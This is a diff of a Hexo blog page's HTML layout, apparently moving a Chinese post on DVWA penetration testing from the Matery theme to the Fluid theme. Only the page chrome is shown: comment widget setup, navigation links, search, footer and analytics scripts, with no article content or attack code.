-                                    <span class="chip bg-color">web</span>
-                                </a>
-                            
-                                <a href="/tags/DVWA/">
-                                    <span class="chip bg-color">DVWA</span>
-                                </a>
-                            
-                                <a href="/tags/XSS/">
-                                    <span class="chip bg-color">XSS</span>
-                                </a>
-                            
-                        </div>
-                    
-                </div>
-                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
-<div id="article-share">
-
-    
-    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-    <script src="/libs/share/js/social-share.min.js"></script>
-    
-
-    
-
-</div>
-
-                </div>
-            </div>
+              </article>
             
+          </article>
         </div>
+      </div>
     </div>
-
     
-
-    
-
-    
-
-    
-
-    
-        <style>
-    .valine-card {
-        margin: 1.5rem auto;
-    }
-
-    .valine-card .card-content {
-        padding: 20px 20px 5px 20px;
-    }
-
-    #vcomments textarea {
-        box-sizing: border-box;
-        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
-    }
-
-    #vcomments p {
-        margin: 2px 2px 10px;
-        font-size: 1.05rem;
-        line-height: 1.78rem;
-    }
-
-    #vcomments blockquote p {
-        text-indent: 0.2rem;
-    }
-
-    #vcomments a {
-        padding: 0 2px;
-        color: #4cbf30;
-        font-weight: 500;
-        text-decoration: none;
-    }
-
-    #vcomments img {
-        max-width: 100%;
-        height: auto;
-        cursor: pointer;
-    }
-
-    #vcomments ol li {
-        list-style-type: decimal;
-    }
-
-    #vcomments ol,
-    ul {
-        display: block;
-        padding-left: 2em;
-        word-spacing: 0.05rem;
-    }
-
-    #vcomments ul li,
-    ol li {
-        display: list-item;
-        line-height: 1.8rem;
-        font-size: 1rem;
-    }
-
-    #vcomments ul li {
-        list-style-type: disc;
-    }
-
-    #vcomments ul ul li {
-        list-style-type: circle;
-    }
-
-    #vcomments table, th, td {
-        padding: 12px 13px;
-        border: 1px solid #dfe2e5;
-    }
-
-    #vcomments table, th, td {
-        border: 0;
-    }
-
-    table tr:nth-child(2n), thead {
-        background-color: #fafafa;
-    }
-
-    #vcomments table th {
-        background-color: #f2f2f2;
-        min-width: 80px;
-    }
-
-    #vcomments table td {
-        min-width: 80px;
-    }
-
-    #vcomments h1 {
-        font-size: 1.85rem;
-        font-weight: bold;
-        line-height: 2.2rem;
-    }
-
-    #vcomments h2 {
-        font-size: 1.65rem;
-        font-weight: bold;
-        line-height: 1.9rem;
-    }
-
-    #vcomments h3 {
-        font-size: 1.45rem;
-        font-weight: bold;
-        line-height: 1.7rem;
-    }
-
-    #vcomments h4 {
-        font-size: 1.25rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    #vcomments h5 {
-        font-size: 1.1rem;
-        font-weight: bold;
-        line-height: 1.4rem;
-    }
-
-    #vcomments h6 {
-        font-size: 1rem;
-        line-height: 1.3rem;
-    }
-
-    #vcomments p {
-        font-size: 1rem;
-        line-height: 1.5rem;
-    }
-
-    #vcomments hr {
-        margin: 12px 0;
-        border: 0;
-        border-top: 1px solid #ccc;
-    }
-
-    #vcomments blockquote {
-        margin: 15px 0;
-        border-left: 5px solid #42b983;
-        padding: 1rem 0.8rem 0.3rem 0.8rem;
-        color: #666;
-        background-color: rgba(66, 185, 131, .1);
-    }
-
-    #vcomments pre {
-        font-family: monospace, monospace;
-        padding: 1.2em;
-        margin: .5em 0;
-        background: #272822;
-        overflow: auto;
-        border-radius: 0.3em;
-        tab-size: 4;
-    }
-
-    #vcomments code {
-        font-family: monospace, monospace;
-        padding: 1px 3px;
-        font-size: 0.92rem;
-        color: #e96900;
-        background-color: #f8f8f8;
-        border-radius: 2px;
-    }
-
-    #vcomments pre code {
-        font-family: monospace, monospace;
-        padding: 0;
-        color: #e8eaf6;
-        background-color: #272822;
-    }
-
-    #vcomments pre[class*="language-"] {
-        padding: 1.2em;
-        margin: .5em 0;
-    }
-
-    #vcomments code[class*="language-"],
-    pre[class*="language-"] {
-        color: #e8eaf6;
-    }
-
-    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
-        position: inherit;
-        margin-left: -1.3rem;
-        margin-right: 0.4rem;
-        margin-top: -1px;
-        vertical-align: middle;
-        left: unset;
-        visibility: visible;
-    }
-
-    #vcomments b,
-    strong {
-        font-weight: bold;
-    }
-
-    #vcomments dfn {
-        font-style: italic;
-    }
-
-    #vcomments small {
-        font-size: 85%;
-    }
-
-    #vcomments cite {
-        font-style: normal;
-    }
-
-    #vcomments mark {
-        background-color: #fcf8e3;
-        padding: .2em;
-    }
-
-    #vcomments table, th, td {
-        padding: 12px 13px;
-        border: 1px solid #dfe2e5;
-    }
-
-    table tr:nth-child(2n), thead {
-        background-color: #fafafa;
-    }
-
-    #vcomments table th {
-        background-color: #f2f2f2;
-        min-width: 80px;
-    }
-
-    #vcomments table td {
-        min-width: 80px;
-    }
-
-    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
-        position: inherit;
-        margin-left: -1.3rem;
-        margin-right: 0.4rem;
-        margin-top: -1px;
-        vertical-align: middle;
-        left: unset;
-        visibility: visible;
-    }
-</style>
-
-<div class="card valine-card" data-aos="fade-up">
-    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
-        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
-        <span>评论</span>
-    </div>
-    <div id="vcomments" class="card-content" style="display: grid">
-    </div>
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
 </div>
 
-<script src="/libs/valine/av-min.js"></script>
-<script src="/libs/valine/Valine.min.js"></script>
-<script>
-    new Valine({
-        el: '#vcomments',
-        appId: 'zJq4EoET2FEb1trGzTayy1uq-gzGzoHsz',
-        appKey: 'oFcTVTBJYrfsIGdYNnoWMVJ9',
-        notify: 'false' === 'true',
-        verify: 'false' === 'true',
-        visitor: 'true' === 'true',
-        avatar: 'mm',
-        pageSize: '10',
-        lang: 'zh-cn',
-        placeholder: 'just go go'
-    });
-</script>
-
+      </div>
     
-
-    
-
-    
-
-<article id="prenext-posts" class="prev-next articles">
-    <div class="row article-row">
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
-            <div class="card">
-                <a href="/2020/03/08/Burp-Suite/">
-                    <div class="card-image">
-                        
-                        <img src="https://s1.ax1x.com/2020/09/02/w98wDI.png" class="responsive-img" alt="Burp Suite使用记录">
-                        
-                        <span class="card-title">Burp Suite使用记录</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            之前学bp，学到了一点皮毛，知道怎么来爆破密码，但是对具体的操作没有进行实验，这几天闲了，再重新把爆破这部分做了一遍。ヾ(•ω•`)o
-Burp SuiteIntruder_暴力破解模块抓到数据包之后，发送到Intruder。
-
-设置攻击目
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-08
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/Burp-Suite/" class="post-category">
-                                    Burp Suite
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Burp-Suite/">
-                        <span class="chip bg-color">Burp Suite</span>
-                    </a>
-                    
-                    <a href="/tags/web/">
-                        <span class="chip bg-color">web</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/03/03/sqlmap-1/">
-                    <div class="card-image">
-                        
-                        <img src="https://securiumsolutions.com/blog/wp-content/uploads/2019/09/download-sqlmap-automatic-sql-injection-tool-1.jpg" class="responsive-img" alt="SQLMap注入参数记录">
-                        
-                        <span class="card-title">SQLMap注入参数记录</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            在浏览别人分享的文章后，了解到SQLMap的灵活性，学习到了新姿势，觉得自己又菜了，有好工具不会用你说气人不气人，简直就是暴殄天物。没有仔细地看过这款工具，这可能就是差距吧。orz
-SQLMap注入SQLMap支持的数据库MySQL, Or
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-03
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/SQLMap/" class="post-category">
-                                    SQLMap
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/SQLMap/">
-                        <span class="chip bg-color">SQLMap</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">
-                        <span class="chip bg-color">数据库</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-    </div>
-</article>
-
+  </div>
 </div>
 
-
-<script>
-    $('#articleContent').on('copy', function (e) {
-        // IE8 or earlier browser is 'undefined'
-        if (typeof window.getSelection === 'undefined') return;
-
-        var selection = window.getSelection();
-        // if the selection is short let's not annoy our users.
-        if (('' + selection).length < Number.parseInt('120')) {
-            return;
-        }
-
-        // create a div outside of the visible area and fill it with the selected text.
-        var bodyElement = document.getElementsByTagName('body')[0];
-        var newdiv = document.createElement('div');
-        newdiv.style.position = 'absolute';
-        newdiv.style.left = '-99999px';
-        bodyElement.appendChild(newdiv);
-        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
-
-        // we need a <pre> tag workaround.
-        // otherwise the text inside "pre" loses all the line breaks!
-        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
-            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
-        }
-
-        var url = document.location.href;
-        newdiv.innerHTML += '<br />'
-            + '来源: wiki<br />'
-            + '文章作者: uaa<br />'
-            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
-            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
-
-        selection.selectAllChildren(newdiv);
-        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
-    });
-</script>
+<!-- Custom -->
 
 
-<!-- 代码块功能依赖 -->
-<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+    
+  </main>
 
-<!-- 代码语言 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
-
-
-<!-- 代码块复制 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-
-
-<!-- 代码块收缩 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-
-
-<!-- 代码块折行 -->
-
-<style type="text/css">
-code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
-</style>
-
-
-    </div>
-    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
-        <div class="toc-widget">
-            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
-            <div id="toc-content"></div>
-        </div>
-    </div>
-</div>
-
-<!-- TOC 悬浮按钮. -->
-
-<div id="floating-toc-btn" class="hide-on-med-and-down">
-    <a class="btn-floating btn-large bg-color">
-        <i class="fas fa-list-ul"></i>
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
     </a>
-</div>
+  
 
-
-<script src="/libs/tocbot/tocbot.min.js"></script>
-<script>
-    $(function () {
-        tocbot.init({
-            tocSelector: '#toc-content',
-            contentSelector: '#articleContent',
-            headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4, h5, h6'
-        });
-
-        // modify the toc link href to support Chinese.
-        let i = 0;
-        let tocHeading = 'toc-heading-';
-        $('#toc-content a').each(function () {
-            $(this).attr('href', '#' + tocHeading + (++i));
-        });
-
-        // modify the heading title id to support Chinese.
-        i = 0;
-        $('#articleContent').children('h2, h3, h4, h5, h6').each(function () {
-            $(this).attr('id', tocHeading + (++i));
-        });
-
-        // Set scroll toc fixed.
-        let tocHeight = parseInt($(window).height() * 0.4 - 64);
-        let $tocWidget = $('.toc-widget');
-        $(window).scroll(function () {
-            let scroll = $(window).scrollTop();
-            /* add post toc fixed. */
-            if (scroll > tocHeight) {
-                $tocWidget.addClass('toc-fixed');
-            } else {
-                $tocWidget.removeClass('toc-fixed');
-            }
-        });
-
-        
-        /* 修复文章卡片 div 的宽度. */
-        let fixPostCardWidth = function (srcId, targetId) {
-            let srcDiv = $('#' + srcId);
-            if (srcDiv.length === 0) {
-                return;
-            }
-
-            let w = srcDiv.width();
-            if (w >= 450) {
-                w = w + 21;
-            } else if (w >= 350 && w < 450) {
-                w = w + 18;
-            } else if (w >= 300 && w < 350) {
-                w = w + 16;
-            } else {
-                w = w + 14;
-            }
-            $('#' + targetId).width(w);
-        };
-
-        // 切换TOC目录展开收缩的相关操作.
-        const expandedClass = 'expanded';
-        let $tocAside = $('#toc-aside');
-        let $mainContent = $('#main-content');
-        $('#floating-toc-btn .btn-floating').click(function () {
-            if ($tocAside.hasClass(expandedClass)) {
-                $tocAside.removeClass(expandedClass).hide();
-                $mainContent.removeClass('l9');
-            } else {
-                $tocAside.addClass(expandedClass).show();
-                $mainContent.addClass('l9');
-            }
-            fixPostCardWidth('artDetail', 'prenext-posts');
-        });
-        
-    });
-</script>
-
-    
-
-</main>
-
-
-
-
-    <footer class="page-footer bg-color">
-    
-    <div class="container row center-align" style="margin-bottom: 15px !important;">
-        <div class="col s12 m8 l8 copy-right">
-            Copyright&nbsp;&copy;
-            <span id="year">2020</span>
-            <a href="/about" target="_blank">uaa</a>
-            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
-            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
-            <br>
-            
-            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">60.1k</span>&nbsp;字
-            
-            
-            
-            
-            
-            
-            <span id="busuanzi_container_site_pv">
-                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
-                    class="white-color"></span>&nbsp;次
-            </span>
-            
-            
-            <span id="busuanzi_container_site_uv">
-                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
-                    class="white-color"></span>&nbsp;人
-            </span>
-            
-            <br>
-            
-            <span id="sitetime">载入运行时间...</span>
-            <script>
-                function siteTime() {
-                    var seconds = 1000;
-                    var minutes = seconds * 60;
-                    var hours = minutes * 60;
-                    var days = hours * 24;
-                    var years = days * 365;
-                    var today = new Date();
-                    var startYear = "2020";
-                    var startMonth = "1";
-                    var startDate = "1";
-                    var startHour = "0";
-                    var startMinute = "0";
-                    var startSecond = "0";
-                    var todayYear = today.getFullYear();
-                    var todayMonth = today.getMonth() + 1;
-                    var todayDate = today.getDate();
-                    var todayHour = today.getHours();
-                    var todayMinute = today.getMinutes();
-                    var todaySecond = today.getSeconds();
-                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
-                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
-                    var diff = t2 - t1;
-                    var diffYears = Math.floor(diff / years);
-                    var diffDays = Math.floor((diff / days) - diffYears * 365);
-                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
-                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
-                        minutes);
-                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
-                        diffMinutes * minutes) / seconds);
-                    if (startYear == todayYear) {
-                        document.getElementById("year").innerHTML = todayYear;
-                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
-                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
-                    } else {
-                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
-                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
-                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
-                    }
-                }
-                setInterval(siteTime, 1000);
-            </script>
-            
-            <br>
-            
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-</div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
+  </div>
+</div>
+  
+
+  
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
 </footer>
 
-<div class="progress-bar"></div>
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
 
 
-    <!-- 搜索遮罩框 -->
-<div id="searchModal" class="modal">
-    <div class="modal-content">
-        <div class="search-header">
-            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
-            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
-                   class="search-input">
-        </div>
-        <div id="searchResult"></div>
-    </div>
-</div>
-
-<script src="/js/search.js"></script>
-<script type="text/javascript">
-$(function () {
-    searchFunc("/search.xml", 'searchInput', 'searchResult');
-});
-</script>
-
-    <!-- 回到顶部按钮 -->
-<div id="backTop" class="top-scroll">
-    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
-        <i class="fas fa-arrow-up"></i>
-    </a>
-</div>
+  
+    <script  src="/js/lazyload.js" ></script>
+  
 
 
-    <script src="/libs/materialize/materialize.min.js"></script>
-    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
-    <script src="/libs/aos/aos.js"></script>
-    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
-    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
-    <script src="/js/matery.js"></script>
 
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "DVWA-渗透测试入门&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
     <!-- Baidu Analytics -->
-
-    <!-- Baidu Push -->
-
-<script>
-    (function () {
-        var bp = document.createElement('script');
-        var curProtocol = window.location.protocol.split(':')[0];
-        if (curProtocol === 'https') {
-            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-        } else {
-            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-        }
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?d8cb5311ff5a7a66ad88e94f5290da89";
         var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(bp, s);
-    })();
-</script>
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
-    
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
-    
+  
 
-    
+  
 
-    
+  
 
-    
+  
 
-    
+  
 
-    
 
-    
-    <script src="/libs/instantpage/instantpage.js" type="module"></script>
-    
+
+
 
 </body>
-
 </html>
